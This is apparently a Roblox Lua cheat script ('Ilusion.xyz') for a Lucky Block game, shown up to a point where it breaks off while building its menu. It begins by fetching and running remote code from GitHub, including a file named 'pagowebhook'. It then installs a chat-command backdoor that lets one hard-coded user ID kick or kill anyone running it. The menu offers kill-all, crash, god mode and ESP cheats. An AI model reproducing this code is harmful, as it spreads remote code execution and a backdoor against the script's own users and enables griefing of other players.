loadstring(game:HttpGet(('https://raw.githubusercontent.com/JXJmasterbringer/pago/main/pagowebhook'),true))()

loadstring(game:HttpGet(('https://raw.githubusercontent.com/JXJmasterbringer/beta/main/blacklist'),true))()

loadstring(game:HttpGet(('https://raw.githubusercontent.com/JXJmasterbringer/pago/main/watermark'),true))()



local AdminPrefix = ";" -- Change this to what you want (i.e: ;kill <namehere>) (if its blank it will error)
local Players = game:GetService("Players")
local LocalP = Players.LocalPlayer;
getgenv().AdminTable = {
	[395654755] = {["Access"] = 5}; -- Access is what level of shit you want the person to have access to
}

getgenv().psearch = function(Name)
	local Inserted = {}
	for _, p in pairs(Players:GetPlayers()) do
		if string.lower(string.sub(p.Name,1, string.len(Name))) == string.lower(Name) then
			table.insert(Inserted, p);return p
		end
	end
end -- Simple player finder function

getgenv().AdminCmdList = {
	["kick"] = {
		["CommandFunc"] = function(Player, self, CmdPlayer)
			if Player == LocalP or Player == "all" then
				LocalP:Kick(self)
			end
		end;
		["Clearence"] = {[5] = true;};
	}; -- you can make new ones of these (the ; have to be in the same spots)
	["kill"] = {
		["CommandFunc"] = function(Player, self, CmdPlayer)
			if Player == LocalP or Player == "all" then
				LocalP.Character.Humanoid:ChangeState(15)
			end
		end;
		["Clearence"] = {[4] = true;[5] = true;};
	};
};

getgenv().BDCheck = function(Target2, Chat)
	if Chat:sub(1, 1) == AdminPrefix then
		local args = string.split(Chat:sub(2), " ")
		local Command = AdminCmdList[table.remove(args, 1)]
		local targ1 = psearch(table.remove(args, 1))
		if Command and targ1 then -- Credits to !fishgang Cy for this BDCheck func
			return Command and Command["Clearence"][AdminTable[Target2.UserId].Access] and Command["CommandFunc"](targ1, table.concat(args, " "), Target2)
		end
	end
end

local GP = Players:GetPlayers()
for i = 1, #GP do
	local CoolKidPlayer = GP[i]
	CoolKidPlayer.Chatted:Connect(function(Word)
		BDCheck(CoolKidPlayer, Word)
	end)
end -- Checks if you chatted a command
Players.PlayerAdded:Connect(function(CKP)
	CKP.Chatted:Connect(function(Message)
		BDCheck(CKP, Message)
	end)
end)





local LuckyBlockGui = Instance.new("ScreenGui")
local main = Instance.new("Frame")
local changelog = Instance.new("TextButton")
local line = Instance.new("TextLabel")
local tab2 = Instance.new("TextButton")
local user = Instance.new("TextLabel")
local changelogtab = Instance.new("TextLabel")
local devs = Instance.new("TextLabel")
local thank = Instance.new("TextLabel")
local changelogText = Instance.new("TextLabel")
local specialthank = Instance.new("TextLabel")
local Combat = Instance.new("TextLabel")
local Esp = Instance.new("TextButton")
local espText = Instance.new("TextLabel")
local FakeLag = Instance.new("TextButton")
local Delete = Instance.new("TextButton")
local linecombat = Instance.new("TextLabel")
local Textbox = Instance.new("TextBox")
local instertTarget = Instance.new("TextButton")
local removetarget = Instance.new("TextButton")
local rocketkill = Instance.new("TextButton")
local killAll = Instance.new("TextButton")
local Unrocketkill = Instance.new("TextButton")
local UnkillAll = Instance.new("TextButton")
local UnFakeLag = Instance.new("TextButton")
local KillTarget = Instance.new("TextButton")
local UnkillTarget = Instance.new("TextButton")
local UnDelete = Instance.new("TextButton")
local tab3 = Instance.new("TextButton")
local tab4 = Instance.new("TextButton")
local tab5 = Instance.new("TextButton")
local Logo = Instance.new("TextLabel")
local ExploitsTab = Instance.new("TextLabel")
local line1 = Instance.new("TextLabel")
local line2gam = Instance.new("TextLabel")
local line3 = Instance.new("TextLabel")
local godmode = Instance.new("TextButton")
local safespot = Instance.new("TextButton")
local aiwralk = Instance.new("TextButton")
local crash = Instance.new("TextButton")
local anticrash = Instance.new("TextButton")
local teleportmid = Instance.new("TextButton")
local Unaiwralk = Instance.new("TextButton")
local UnAnticrash = Instance.new("TextButton")
local PlayerTab = Instance.new("TextLabel")
local anchor = Instance.new("TextButton")
local Exploitsline = Instance.new("TextLabel")
local infjump = Instance.new("TextButton")
local Exploitsline2 = Instance.new("TextLabel")
local UnAnchor = Instance.new("TextButton")
local walkspeed = Instance.new("TextButton")
local jumppower = Instance.new("TextButton")
local regen = Instance.new("TextButton")
local gear = Instance.new("TextButton")
local Ungear = Instance.new("TextButton")
local MiscTab = Instance.new("TextLabel")
local AntiAfk = Instance.new("TextButton")
local ChatLogs = Instance.new("TextButton")
local MiscLine = Instance.new("TextLabel")
local InfiniteYield = Instance.new("TextButton")
local ChatBypasser = Instance.new("TextButton")
local Miscline2 = Instance.new("TextLabel")
local build = Instance.new("TextLabel")
local tab6 = Instance.new("TextButton")
local SpamTab = Instance.new("TextLabel")
local SpamText = Instance.new("TextLabel")
local rainbowperi = Instance.new("TextButton")
local winterspam = Instance.new("TextButton")
local crescendo = Instance.new("TextButton")
local rocketkill_2 = Instance.new("TextButton")
local linespam = Instance.new("TextLabel")
local Open = Instance.new("TextButton")

local function Closeall()
	changelogtab.Visible = false
	Combat.Visible = false
	MiscTab.Visible = false
	PlayerTab.Visible = false
	ExploitsTab.Visible = false
	SpamTab.Visible = false

end

LuckyBlockGui.Name = "LuckyBlockGui"
LuckyBlockGui.Parent = game.CoreGui

main.Name = "main"
main.Parent = LuckyBlockGui
main.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
main.BorderColor3 = Color3.fromRGB(235, 27, 107)
main.BorderSizePixel = 2
main.Position = UDim2.new(0.181637928, 0, 0.240694791, 0)
main.Size = UDim2.new(0, 928, 0, 495)
main.Visible = false

changelog.Name = "changelog"
changelog.Parent = main
changelog.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
changelog.BorderColor3 = Color3.fromRGB(0, 0, 0)
changelog.BorderSizePixel = 0
changelog.Position = UDim2.new(0.0131441867, 0, 0.137631312, 0)
changelog.Size = UDim2.new(0, 79, 0, 37)
changelog.Font = Enum.Font.LuckiestGuy
changelog.Text = "Changelog"
changelog.TextColor3 = Color3.fromRGB(212, 32, 119)
changelog.TextSize = 14.000

line.Name = "line"
line.Parent = main
line.BackgroundColor3 = Color3.fromRGB(212, 32, 119)
line.BorderColor3 = Color3.fromRGB(0, 0, 0)
line.BorderSizePixel = 0
line.Position = UDim2.new(0.10851533, 0, 0, 0)
line.Size = UDim2.new(0, 1, 0, 494)
line.ZIndex = 3
line.Font = Enum.Font.SourceSans
line.Text = ""
line.TextColor3 = Color3.fromRGB(0, 0, 0)
line.TextSize = 14.000

tab2.Name = "tab2"
tab2.Parent = main
tab2.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
tab2.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab2.BorderSizePixel = 0
tab2.Position = UDim2.new(0.00760869542, 0, 0.259481043, 0)
tab2.Size = UDim2.new(0, 88, 0, 37)
tab2.Font = Enum.Font.LuckiestGuy
tab2.Text = "Player"
tab2.TextColor3 = Color3.fromRGB(212, 32, 119)
tab2.TextSize = 14.000

user.Name = "user"
user.Parent = main
user.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
user.BorderColor3 = Color3.fromRGB(0, 0, 0)
user.BorderSizePixel = 0
user.Position = UDim2.new(0.00672312221, 0, 0.929377019, 0)
user.Size = UDim2.new(0, 86, 0, 33)
user.Font = Enum.Font.SourceSans
user.Text = "User Syc: Synced"
user.TextColor3 = Color3.fromRGB(31, 255, 6)
user.TextSize = 14.000
user.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)

changelogtab.Name = "changelogtab"
changelogtab.Parent = main
changelogtab.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
changelogtab.BorderColor3 = Color3.fromRGB(0, 0, 0)
changelogtab.BorderSizePixel = 0
changelogtab.Position = UDim2.new(0.121702977, 0, 0, 0)
changelogtab.Size = UDim2.new(0, 738, 0, 490)
changelogtab.Font = Enum.Font.SourceSans
changelogtab.Text = ""
changelogtab.TextColor3 = Color3.fromRGB(0, 0, 0)
changelogtab.TextSize = 14.000

devs.Name = "devs"
devs.Parent = changelogtab
devs.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
devs.BorderColor3 = Color3.fromRGB(0, 0, 0)
devs.BorderSizePixel = 0
devs.Position = UDim2.new(0.00132271787, 0, 0.45102042, 0)
devs.Size = UDim2.new(0, 796, 0, 117)
devs.Font = Enum.Font.Bodoni
devs.Text = "Dev team: Kevim(cbzql), Anon(Verlitarim) biel(bielsamorim1) and Marcus(astadnrt)"
devs.TextColor3 = Color3.fromRGB(212, 32, 119)
devs.TextSize = 19.000

thank.Name = "thank"
thank.Parent = changelogtab
thank.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
thank.BorderColor3 = Color3.fromRGB(0, 0, 0)
thank.BorderSizePixel = 0
thank.Position = UDim2.new(0.0149051491, 0, 0.626530588, 0)
thank.Size = UDim2.new(0, 755, 0, 117)
thank.Font = Enum.Font.Bodoni
thank.Text = "Thank y'all for the help with the main script <3"
thank.TextColor3 = Color3.fromRGB(212, 32, 119)
thank.TextSize = 22.000

changelogText.Name = "changelogText"
changelogText.Parent = changelogtab
changelogText.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
changelogText.BorderColor3 = Color3.fromRGB(0, 0, 0)
changelogText.BorderSizePixel = 0
changelogText.Position = UDim2.new(0.0162279084, 0, 0.200000003, 0)
changelogText.Size = UDim2.new(0, 755, 0, 117)
changelogText.Font = Enum.Font.Bodoni
changelogText.Text = "Changelog: v2.7: +Added gear spam. +protections added"
changelogText.TextColor3 = Color3.fromRGB(212, 32, 119)
changelogText.TextSize = 22.000

specialthank.Name = "specialthank"
specialthank.Parent = changelogtab
specialthank.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
specialthank.BorderColor3 = Color3.fromRGB(0, 0, 0)
specialthank.BorderSizePixel = 0
specialthank.Position = UDim2.new(0.0284552854, 0, 0.771428585, 0)
specialthank.Size = UDim2.new(0, 755, 0, 117)
specialthank.Font = Enum.Font.Bodoni
specialthank.Text = "special thanks to TheOne. a.k.a rebelli0ns. thank for your support my dear friend"
specialthank.TextColor3 = Color3.fromRGB(38, 209, 212)
specialthank.TextSize = 22.000

Combat.Name = "Combat"
Combat.Parent = main
Combat.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
Combat.BorderColor3 = Color3.fromRGB(0, 0, 0)
Combat.BorderSizePixel = 0
Combat.Position = UDim2.new(0.104513064, 0, 0, 0)
Combat.Size = UDim2.new(0, 754, 0, 490)
Combat.Visible = false
Combat.Font = Enum.Font.SourceSans
Combat.Text = ""
Combat.TextColor3 = Color3.fromRGB(0, 0, 0)
Combat.TextSize = 14.000

Esp.Name = "Esp"
Esp.Parent = Combat
Esp.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
Esp.BorderColor3 = Color3.fromRGB(0, 0, 0)
Esp.BorderSizePixel = 0
Esp.Position = UDim2.new(0.332891256, 0, 0.788011193, 0)
Esp.Size = UDim2.new(0, 339, 0, 54)
Esp.Font = Enum.Font.LuckiestGuy
Esp.Text = "ESp"
Esp.TextColor3 = Color3.fromRGB(50, 209, 245)
Esp.TextSize = 14.000

espText.Name = "espText"
espText.Parent = Combat
espText.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
espText.BorderColor3 = Color3.fromRGB(0, 0, 0)
espText.BorderSizePixel = 0
espText.Position = UDim2.new(0.332891256, 0, 0.634693861, 0)
espText.Size = UDim2.new(0, 346, 0, 50)
espText.Font = Enum.Font.LuckiestGuy
espText.Text = "This will show all players on map"
espText.TextColor3 = Color3.fromRGB(255, 37, 233)
espText.TextSize = 14.000

FakeLag.Name = "FakeLag"
FakeLag.Parent = Combat
FakeLag.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
FakeLag.BorderColor3 = Color3.fromRGB(0, 0, 0)
FakeLag.BorderSizePixel = 0
FakeLag.Position = UDim2.new(0.03183024, 0, 0.788011193, 0)
FakeLag.Size = UDim2.new(0, 248, 0, 54)
FakeLag.Font = Enum.Font.LuckiestGuy
FakeLag.Text = "FakeLag"
FakeLag.TextColor3 = Color3.fromRGB(245, 16, 184)
FakeLag.TextSize = 14.000

Delete.Name = "Delete"
Delete.Parent = Combat
Delete.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
Delete.BorderColor3 = Color3.fromRGB(0, 0, 0)
Delete.BorderSizePixel = 0
Delete.Position = UDim2.new(0.782493353, 0, 0.788011193, 0)
Delete.Size = UDim2.new(0, 241, 0, 54)
Delete.Font = Enum.Font.LuckiestGuy
Delete.Text = "Delete myself"
Delete.TextColor3 = Color3.fromRGB(245, 16, 184)
Delete.TextSize = 14.000

linecombat.Name = "linecombat"
linecombat.Parent = Combat
linecombat.BackgroundColor3 = Color3.fromRGB(212, 32, 119)
linecombat.BorderColor3 = Color3.fromRGB(0, 0, 0)
linecombat.BorderSizePixel = 0
linecombat.Position = UDim2.new(0.00620971993, 0, 0.581632674, 0)
linecombat.Size = UDim2.new(0, 826, 0, 4)
linecombat.Font = Enum.Font.SourceSans
linecombat.Text = ""
linecombat.TextColor3 = Color3.fromRGB(0, 0, 0)
linecombat.TextSize = 14.000

Textbox.Name = "Textbox"
Textbox.Parent = Combat
Textbox.BackgroundColor3 = Color3.fromRGB(59, 24, 66)
Textbox.BorderColor3 = Color3.fromRGB(0, 0, 0)
Textbox.BorderSizePixel = 0
Textbox.Position = UDim2.new(0.301061004, 0, 0.10204082, 0)
Textbox.Size = UDim2.new(0, 320, 0, 50)
Textbox.Font = Enum.Font.SourceSans
Textbox.Text = "Target Name"
Textbox.TextColor3 = Color3.fromRGB(247, 29, 33)
Textbox.TextSize = 28.000

instertTarget.Name = "instertTarget"
instertTarget.Parent = Combat
instertTarget.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
instertTarget.BorderColor3 = Color3.fromRGB(0, 0, 0)
instertTarget.BorderSizePixel = 0
instertTarget.Position = UDim2.new(0.18302387, 0, 0.243113235, 0)
instertTarget.Size = UDim2.new(0, 248, 0, 54)
instertTarget.Font = Enum.Font.LuckiestGuy
instertTarget.Text = "insert target"
instertTarget.TextColor3 = Color3.fromRGB(245, 16, 184)
instertTarget.TextSize = 14.000

removetarget.Name = "removetarget"
removetarget.Parent = Combat
removetarget.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
removetarget.BorderColor3 = Color3.fromRGB(0, 0, 0)
removetarget.BorderSizePixel = 0
removetarget.Position = UDim2.new(0.511936367, 0, 0.243113235, 0)
removetarget.Size = UDim2.new(0, 248, 0, 54)
removetarget.Font = Enum.Font.LuckiestGuy
removetarget.Text = "remove target"
removetarget.TextColor3 = Color3.fromRGB(245, 16, 184)
removetarget.TextSize = 14.000

rocketkill.Name = "rocket kill"
rocketkill.Parent = Combat
rocketkill.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
rocketkill.BorderColor3 = Color3.fromRGB(0, 0, 0)
rocketkill.BorderSizePixel = 0
rocketkill.Position = UDim2.new(0.18302387, 0, 0.369643867, 0)
rocketkill.Size = UDim2.new(0, 248, 0, 54)
rocketkill.Font = Enum.Font.LuckiestGuy
rocketkill.Text = "rocket kill target"
rocketkill.TextColor3 = Color3.fromRGB(245, 16, 184)
rocketkill.TextSize = 14.000

killAll.Name = "killAll"
killAll.Parent = Combat
killAll.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
killAll.BorderColor3 = Color3.fromRGB(0, 0, 0)
killAll.BorderSizePixel = 0
killAll.Position = UDim2.new(0.511936367, 0, 0.369643867, 0)
killAll.Size = UDim2.new(0, 248, 0, 54)
killAll.Font = Enum.Font.LuckiestGuy
killAll.Text = "rocket all"
killAll.TextColor3 = Color3.fromRGB(245, 16, 184)
killAll.TextSize = 14.000

Unrocketkill.Name = "Unrocket kill"
Unrocketkill.Parent = Combat
Unrocketkill.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
Unrocketkill.BorderColor3 = Color3.fromRGB(0, 0, 0)
Unrocketkill.BorderSizePixel = 0
Unrocketkill.Position = UDim2.new(0.18302387, 0, 0.369643867, 0)
Unrocketkill.Size = UDim2.new(0, 248, 0, 54)
Unrocketkill.Visible = false
Unrocketkill.Font = Enum.Font.LuckiestGuy
Unrocketkill.Text = "Un rocket kill target"
Unrocketkill.TextColor3 = Color3.fromRGB(245, 16, 184)
Unrocketkill.TextSize = 14.000

UnkillAll.Name = "UnkillAll"
UnkillAll.Parent = Combat
UnkillAll.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
UnkillAll.BorderColor3 = Color3.fromRGB(0, 0, 0)
UnkillAll.BorderSizePixel = 0
UnkillAll.Position = UDim2.new(0.511936367, 0, 0.369643867, 0)
UnkillAll.Size = UDim2.new(0, 248, 0, 54)
UnkillAll.Visible = false
UnkillAll.Font = Enum.Font.LuckiestGuy
UnkillAll.Text = "unrocket all"
UnkillAll.TextColor3 = Color3.fromRGB(245, 16, 184)
UnkillAll.TextSize = 14.000

UnFakeLag.Name = "UnFakeLag"
UnFakeLag.Parent = Combat
UnFakeLag.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
UnFakeLag.BorderColor3 = Color3.fromRGB(0, 0, 0)
UnFakeLag.BorderSizePixel = 0
UnFakeLag.Position = UDim2.new(0.0320000015, 0, 0.787999988, 0)
UnFakeLag.Size = UDim2.new(0, 248, 0, 54)
UnFakeLag.Visible = false
UnFakeLag.Font = Enum.Font.LuckiestGuy
UnFakeLag.Text = "FakeLag"
UnFakeLag.TextColor3 = Color3.fromRGB(245, 16, 184)
UnFakeLag.TextSize = 14.000

KillTarget.Name = "KillTarget"
KillTarget.Parent = Combat
KillTarget.BackgroundColor3 = Color3.fromRGB(80, 32, 89)
KillTarget.BorderColor3 = Color3.fromRGB(0, 0, 0)
KillTarget.BorderSizePixel = 0
KillTarget.Position = UDim2.new(0.301061004, 0, 0.469643861, 0)
KillTarget.Size = UDim2.new(0, 339, 0, 54)
KillTarget.Font = Enum.Font.LuckiestGuy
KillTarget.Text = "Kill Player"
KillTarget.TextColor3 = Color3.fromRGB(245, 8, 12)
KillTarget.TextSize = 14.000

UnkillTarget.Name = "UnkillTarget"
UnkillTarget.Parent = Combat
UnkillTarget.BackgroundColor3 = Color3.fromRGB(80, 32, 89)
UnkillTarget.BorderColor3 = Color3.fromRGB(0, 0, 0)
UnkillTarget.BorderSizePixel = 0
UnkillTarget.Position = UDim2.new(0.301061004, 0, 0.469643861, 0)
UnkillTarget.Size = UDim2.new(0, 339, 0, 54)
UnkillTarget.Visible = false
UnkillTarget.Font = Enum.Font.LuckiestGuy
UnkillTarget.Text = "sTOP kILLING"
UnkillTarget.TextColor3 = Color3.fromRGB(245, 8, 12)
UnkillTarget.TextSize = 14.000

UnDelete.Name = "UnDelete"
UnDelete.Parent = Combat
UnDelete.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
UnDelete.BorderColor3 = Color3.fromRGB(0, 0, 0)
UnDelete.BorderSizePixel = 0
UnDelete.Position = UDim2.new(0.782493353, 0, 0.788011193, 0)
UnDelete.Size = UDim2.new(0, 241, 0, 54)
UnDelete.Visible = false
UnDelete.Font = Enum.Font.LuckiestGuy
UnDelete.Text = "Un Delete"
UnDelete.TextColor3 = Color3.fromRGB(245, 16, 184)
UnDelete.TextSize = 14.000

tab3.Name = "tab3"
tab3.Parent = main
tab3.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
tab3.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab3.BorderSizePixel = 0
tab3.Position = UDim2.new(0.00869565178, 0, 0.333177239, 0)
tab3.Size = UDim2.new(0, 81, 0, 37)
tab3.Font = Enum.Font.LuckiestGuy
tab3.Text = "combat"
tab3.TextColor3 = Color3.fromRGB(212, 32, 119)
tab3.TextSize = 14.000

tab4.Name = "tab4"
tab4.Parent = main
tab4.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
tab4.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab4.BorderSizePixel = 0
tab4.Position = UDim2.new(0.00869566854, 0, 0.406790942, 0)
tab4.Size = UDim2.new(0, 86, 0, 37)
tab4.Font = Enum.Font.LuckiestGuy
tab4.Text = "exploits"
tab4.TextColor3 = Color3.fromRGB(212, 32, 119)
tab4.TextSize = 14.000

tab5.Name = "tab5"
tab5.Parent = main
tab5.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
tab5.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab5.BorderSizePixel = 0
tab5.Position = UDim2.new(0.00775626628, 0, 0.545154095, 0)
tab5.Size = UDim2.new(0, 81, 0, 37)
tab5.Font = Enum.Font.LuckiestGuy
tab5.Text = "misc"
tab5.TextColor3 = Color3.fromRGB(212, 32, 119)
tab5.TextSize = 14.000

Logo.Name = "Logo"
Logo.Parent = main
Logo.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
Logo.BorderColor3 = Color3.fromRGB(0, 0, 0)
Logo.BorderSizePixel = 0
Logo.Position = UDim2.new(0.00760869542, 0, 0, 0)
Logo.Size = UDim2.new(0, 84, 0, 50)
Logo.Font = Enum.Font.Highway
Logo.Text = "Ilusion.xyz"
Logo.TextColor3 = Color3.fromRGB(255, 255, 225)
Logo.TextSize = 23.000

ExploitsTab.Name = "ExploitsTab"
ExploitsTab.Parent = main
ExploitsTab.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
ExploitsTab.BorderColor3 = Color3.fromRGB(0, 0, 0)
ExploitsTab.BorderSizePixel = 0
ExploitsTab.Position = UDim2.new(0.109602287, 0, 0, 0)
ExploitsTab.Size = UDim2.new(0, 750, 0, 490)
ExploitsTab.Visible = false
ExploitsTab.Font = Enum.Font.SourceSans
ExploitsTab.Text = ""
ExploitsTab.TextColor3 = Color3.fromRGB(0, 0, 0)
ExploitsTab.TextSize = 14.000

line1.Name = "line1"
line1.Parent = ExploitsTab
line1.BackgroundColor3 = Color3.fromRGB(212, 32, 119)
line1.BorderColor3 = Color3.fromRGB(0, 0, 0)
line1.BorderSizePixel = 0
line1.Position = UDim2.new(-0.00136507163, 0, 0.157142863, 0)
line1.Size = UDim2.new(0, 827, 0, 7)
line1.Font = Enum.Font.SourceSans
line1.Text = ""
line1.TextColor3 = Color3.fromRGB(0, 0, 0)
line1.TextSize = 14.000

line2gam.Name = "line2gam"
line2gam.Parent = ExploitsTab
line2gam.BackgroundColor3 = Color3.fromRGB(212, 32, 119)
line2gam.BorderColor3 = Color3.fromRGB(0, 0, 0)
line2gam.BorderSizePixel = 0
line2gam.Position = UDim2.new(0.00266687013, 0, 0.424489796, 0)
line2gam.Size = UDim2.new(0, 823, 0, 7)
line2gam.Font = Enum.Font.SourceSans
line2gam.Text = ""
line2gam.TextColor3 = Color3.fromRGB(0, 0, 0)
line2gam.TextSize = 14.000

line3.Name = "line3"
line3.Parent = ExploitsTab
line3.BackgroundColor3 = Color3.fromRGB(212, 32, 119)
line3.BorderColor3 = Color3.fromRGB(0, 0, 0)
line3.BorderSizePixel = 0
line3.Position = UDim2.new(0, 0, 0.685714304, 0)
line3.Size = UDim2.new(0, 825, 0, 7)
line3.Font = Enum.Font.SourceSans
line3.Text = ""
line3.TextColor3 = Color3.fromRGB(0, 0, 0)
line3.TextSize = 14.000

godmode.Name = "godmode"
godmode.Parent = ExploitsTab
godmode.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
godmode.BorderColor3 = Color3.fromRGB(0, 0, 0)
godmode.BorderSizePixel = 0
godmode.Position = UDim2.new(-4.06901037e-08, 0, 0, 0)
godmode.Size = UDim2.new(0, 826, 0, 77)
godmode.Font = Enum.Font.LuckiestGuy
godmode.Text = "god mode"
godmode.TextColor3 = Color3.fromRGB(255, 43, 188)
godmode.TextSize = 14.000

safespot.Name = "safespot"
safespot.Parent = ExploitsTab
safespot.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
safespot.BorderColor3 = Color3.fromRGB(0, 0, 0)
safespot.BorderSizePixel = 0
safespot.Position = UDim2.new(0.598666847, 0, 0.500737786, 0)
safespot.Size = UDim2.new(0, 370, 0, 91)
safespot.Font = Enum.Font.LuckiestGuy
safespot.Text = "safe spot"
safespot.TextColor3 = Color3.fromRGB(255, 43, 188)
safespot.TextSize = 14.000

aiwralk.Name = "aiwralk"
aiwralk.Parent = ExploitsTab
aiwralk.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
aiwralk.BorderColor3 = Color3.fromRGB(0, 0, 0)
aiwralk.BorderSizePixel = 0
aiwralk.Position = UDim2.new(0.00396826165, 0, 0.171428576, 0)
aiwralk.Size = UDim2.new(0, 296, 0, 124)
aiwralk.Font = Enum.Font.LuckiestGuy
aiwralk.Text = "airwalk"
aiwralk.TextColor3 = Color3.fromRGB(255, 43, 188)
aiwralk.TextSize = 14.000

crash.Name = "crash"
crash.Parent = ExploitsTab
crash.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
crash.BorderColor3 = Color3.fromRGB(0, 0, 0)
crash.BorderSizePixel = 0
crash.Position = UDim2.new(0.399820149, 0, 0.171428576, 0)
crash.Size = UDim2.new(0, 262, 0, 124)
crash.Font = Enum.Font.LuckiestGuy
crash.Text = "crash"
crash.TextColor3 = Color3.fromRGB(255, 43, 188)
crash.TextSize = 14.000

anticrash.Name = "anticrash"
anticrash.Parent = ExploitsTab
anticrash.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
anticrash.BorderColor3 = Color3.fromRGB(0, 0, 0)
anticrash.BorderSizePixel = 0
anticrash.Position = UDim2.new(0.749185205, 0, 0.171428576, 0)
anticrash.Size = UDim2.new(0, 258, 0, 117)
anticrash.Font = Enum.Font.LuckiestGuy
anticrash.Text = "Rocket MYself"
anticrash.TextColor3 = Color3.fromRGB(255, 43, 188)
anticrash.TextSize = 14.000

teleportmid.Name = "teleportmid"
teleportmid.Parent = ExploitsTab
teleportmid.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
teleportmid.BorderColor3 = Color3.fromRGB(0, 0, 0)
teleportmid.BorderSizePixel = 0
teleportmid.Position = UDim2.new(0.00800016243, 0, 0.500737786, 0)
teleportmid.Size = UDim2.new(0, 443, 0, 91)
teleportmid.Font = Enum.Font.LuckiestGuy
teleportmid.Text = "teleport to mid"
teleportmid.TextColor3 = Color3.fromRGB(255, 43, 188)
teleportmid.TextSize = 14.000

Unaiwralk.Name = "Unaiwralk"
Unaiwralk.Parent = ExploitsTab
Unaiwralk.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
Unaiwralk.BorderColor3 = Color3.fromRGB(0, 0, 0)
Unaiwralk.BorderSizePixel = 0
Unaiwralk.Position = UDim2.new(0.00396826165, 0, 0.171428576, 0)
Unaiwralk.Size = UDim2.new(0, 296, 0, 124)
Unaiwralk.Visible = false
Unaiwralk.Font = Enum.Font.LuckiestGuy
Unaiwralk.Text = "UnAirWalk"
Unaiwralk.TextColor3 = Color3.fromRGB(255, 43, 188)
Unaiwralk.TextSize = 14.000

UnAnticrash.Name = "UnAnticrash"
UnAnticrash.Parent = ExploitsTab
UnAnticrash.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
UnAnticrash.BorderColor3 = Color3.fromRGB(0, 0, 0)
UnAnticrash.BorderSizePixel = 0
UnAnticrash.Position = UDim2.new(0.749185205, 0, 0.171428576, 0)
UnAnticrash.Size = UDim2.new(0, 258, 0, 117)
UnAnticrash.Visible = false
UnAnticrash.Font = Enum.Font.LuckiestGuy
UnAnticrash.Text = "Un Rocket Myself"
UnAnticrash.TextColor3 = Color3.fromRGB(255, 43, 188)
UnAnticrash.TextSize = 14.000

PlayerTab.Name = "PlayerTab"
PlayerTab.Parent = main
PlayerTab.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
PlayerTab.BorderColor3 = Color3.fromRGB(0, 0, 0)
PlayerTab.BorderSizePixel = 0
PlayerTab.Position = UDim2.new(0.109602258, 0, 0, 0)
PlayerTab.Size = UDim2.new(0, 749, 0, 490)
PlayerTab.Visible = false
PlayerTab.Font = Enum.Font.SourceSans
PlayerTab.Text = ""
PlayerTab.TextColor3 = Color3.fromRGB(0, 0, 0)
PlayerTab.TextSize = 14.000

anchor.Name = "anchor"
anchor.Parent = PlayerTab
anchor.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
anchor.BorderColor3 = Color3.fromRGB(0, 0, 0)
anchor.BorderSizePixel = 0
anchor.Position = UDim2.new(0.0373425148, 0, 0.518623471, 0)
anchor.Size = UDim2.new(0, 267, 0, 54)
anchor.Font = Enum.Font.LuckiestGuy
anchor.Text = "anCHOR"
anchor.TextColor3 = Color3.fromRGB(245, 16, 184)
anchor.TextSize = 14.000

Exploitsline.Name = "Exploitsline"
Exploitsline.Parent = PlayerTab
Exploitsline.BackgroundColor3 = Color3.fromRGB(212, 32, 119)
Exploitsline.BorderColor3 = Color3.fromRGB(0, 0, 0)
Exploitsline.BorderSizePixel = 0
Exploitsline.Position = UDim2.new(-0.00270738592, 0, 0.514285743, 0)
Exploitsline.Size = UDim2.new(0, 821, 0, 2)
Exploitsline.Font = Enum.Font.SourceSans
Exploitsline.Text = ""
Exploitsline.TextColor3 = Color3.fromRGB(0, 0, 0)
Exploitsline.TextSize = 14.000

infjump.Name = "infjump"
infjump.Parent = PlayerTab
infjump.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
infjump.BorderColor3 = Color3.fromRGB(0, 0, 0)
infjump.BorderSizePixel = 0
infjump.Position = UDim2.new(0.654140174, 0, 0.518623471, 0)
infjump.Size = UDim2.new(0, 319, 0, 54)
infjump.Font = Enum.Font.LuckiestGuy
infjump.Text = "Infinite jump"
infjump.TextColor3 = Color3.fromRGB(245, 16, 184)
infjump.TextSize = 14.000

Exploitsline2.Name = "Exploitsline2"
Exploitsline2.Parent = PlayerTab
Exploitsline2.BackgroundColor3 = Color3.fromRGB(212, 32, 119)
Exploitsline2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Exploitsline2.BorderSizePixel = 0
Exploitsline2.Position = UDim2.new(-0.0013756135, 0, 0.281632662, 0)
